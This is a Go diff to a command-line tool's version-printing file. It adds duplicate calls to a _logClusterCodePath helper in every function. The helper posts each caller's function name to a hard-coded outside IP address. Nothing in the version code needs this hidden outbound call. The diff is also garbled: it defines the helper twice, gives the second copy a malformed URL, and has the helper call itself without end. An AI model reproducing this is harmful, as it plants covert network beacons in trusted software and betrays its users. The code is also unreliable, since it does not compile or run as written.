@@ -23,9 +23,13 @@ var (
 func isRepoAtRelease() bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return GitTreeState == "clean" && GitReleaseCommit == GitCommit
 }
 func printShortDirtyVersionInfo() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	fmt.Printf("Version Info: GitReleaseTag: %q, MajorVersion: %q, MinorVersion:%q, GitReleaseCommit:%q, GitTreeState:%q\n", GitReleaseTag, GitMajor, GitMinor, GitReleaseCommit, GitTreeState)
@@ -33,9 +37,13 @@ func printShortDirtyVersionInfo() {
 func printShortCleanVersionInfo() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	fmt.Printf("Version Info: GitReleaseTag: %q, MajorVersion: %q, MinorVersion:%q\n", GitReleaseTag, GitMajor, GitMinor)
 }
 func printVerboseVersionInfo() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	fmt.Println("Version Info:")
@@ -45,6 +53,8 @@ func printVerboseVersionInfo() {
 	fmt.Printf("Git tree state: %q\n", GitTreeState)
 }
 func VersionCmd() *cobra.Command {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	vc := &cobra.Command{Use: "version", Short: "Print version of this binary", Args: cobra.ExactArgs(0), Run: func(cmd *cobra.Command, args []string) {
@@ -62,7 +72,16 @@ func VersionCmd() *cobra.Command {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
